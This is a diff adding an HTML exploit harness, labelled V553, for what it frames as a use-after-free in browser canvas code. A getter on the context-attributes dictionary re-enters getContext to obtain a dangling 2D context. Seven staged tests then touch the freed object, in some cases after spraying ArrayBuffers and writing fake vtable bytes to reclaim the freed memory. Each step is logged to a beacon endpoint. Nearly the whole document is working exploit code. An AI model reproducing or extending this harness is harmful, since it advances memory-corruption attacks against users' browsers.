@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V553</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V553-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V553-binding-isolate');
+
+// T1: SINGLE UAF + save() immediately — NO AB spray
+// If this crashes, the binding path itself is the problem, not zeroed memory
+(function T1(){
+  b('T1-START','uaf-then-save-no-spray');
+  var ctx=triggerUAF();
+  b('T1-UAF','done');
+  b('T1-PRESAVE','about to call save() on freed memory (no AB)');
+  try{
+    ctx.save();
+    b('T1-SAVE','save() OK on freed memory!');
+  }catch(e){b('T1-SAVE-ERR',e.message)}
+  b('T1-DONE','ok');
+})();
+
+// T2: SINGLE UAF + getContextAttributes() immediately — NO AB spray
+(function T2(){
+  b('T2-START','uaf-then-getattr-no-spray');
+  var ctx=triggerUAF();
+  b('T2-UAF','done');
+  b('T2-PREATTR','about to call getContextAttributes() on freed memory');
+  try{
+    var a=ctx.getContextAttributes();
+    b('T2-ATTR',JSON.stringify(a));
+  }catch(e){b('T2-ATTR-ERR',e.message)}
+  b('T2-DONE','ok');
+})();
+
+// T3: SINGLE UAF + lineWidth read — NO AB spray
+(function T3(){
+  b('T3-START','uaf-then-lw-no-spray');
+  var ctx=triggerUAF();
+  b('T3-UAF','done');
+  b('T3-PRELW','about to read lineWidth on freed memory');
+  try{
+    var lw=ctx.lineWidth;
+    b('T3-LW','lineWidth='+lw);
+  }catch(e){b('T3-LW-ERR',e.message)}
+  b('T3-DONE','ok');
+})();
+
+// T4: SINGLE UAF + AB spray + DataView write 0x41 at offset 0 (fake vtable) + save()
+(function T4(){
+  b('T4-START','uaf-ab-fakevtable-save');
+  var ctx=triggerUAF();
+  b('T4-UAF','done');
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T4-SPRAY','50 ABs');
+  // Write non-zero bytes at offset 0 in ALL ABs (one of them is the reclaimer)
+  for(var i=0;i<50;i++){
+    var dv=new DataView(abs[i]);
+    // Write a "vtable-like" non-zero value at offset 0
+    dv.setFloat64(0,1.1,true); // 8 non-zero bytes
+  }
+  b('T4-FILL','wrote 8B at offset 0 in all ABs');
+  b('T4-PRESAVE','about to call save()');
+  try{
+    ctx.save();
+    b('T4-SAVE','save() OK with fake vtable!');
+  }catch(e){b('T4-SAVE-ERR',e.message)}
+  b('T4-DONE','ok');
+})();
+
+// T5: SINGLE UAF + AB spray + fill ALL 768 bytes with 0x01 + save()
+(function T5(){
+  b('T5-START','uaf-ab-fullfill-save');
+  var ctx=triggerUAF();
+  b('T5-UAF','done');
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T5-SPRAY','50 ABs');
+  for(var i=0;i<50;i++){
+    var u8=new Uint8Array(abs[i]);
+    for(var j=0;j<768;j++) u8[j]=1;
+  }
+  b('T5-FILL','filled all 768 bytes with 0x01');
+  b('T5-PRESAVE','about to call save()');
+  try{
+    ctx.save();
+    b('T5-SAVE','save() OK with all-0x01!');
+  }catch(e){b('T5-SAVE-ERR',e.message)}
+  b('T5-DONE','ok');
+})();
+
+// T6: SINGLE UAF + AB spray (zeroed) + read lineWidth
+(function T6(){
+  b('T6-START','uaf-ab-zeroed-lw');
+  var ctx=triggerUAF();
+  b('T6-UAF','done');
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T6-SPRAY','50 ABs');
+  b('T6-PRELW','about to read lineWidth on zeroed AB memory');
+  try{
+    var lw=ctx.lineWidth;
+    b('T6-LW','lineWidth='+lw);
+  }catch(e){b('T6-LW-ERR',e.message)}
+  b('T6-DONE','ok');
+})();
+
+// T7: SINGLE UAF + AB spray + fill 0x01 + getContextAttributes
+(function T7(){
+  b('T7-START','uaf-ab-filled-getattr');
+  var ctx=triggerUAF();
+  b('T7-UAF','done');
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T7-SPRAY','50 ABs');
+  for(var i=0;i<50;i++){
+    var u8=new Uint8Array(abs[i]);
+    for(var j=0;j<768;j++) u8[j]=1;
+  }
+  b('T7-FILL','filled all 768B with 0x01');
+  b('T7-PREATTR','about to call getContextAttributes()');
+  try{
+    var a=ctx.getContextAttributes();
+    b('T7-ATTR',JSON.stringify(a));
+  }catch(e){b('T7-ATTR-ERR',e.message)}
+  b('T7-DONE','ok');
+})();
+
+b('DONE','V553-all-complete');
+</script>
+</body></html>
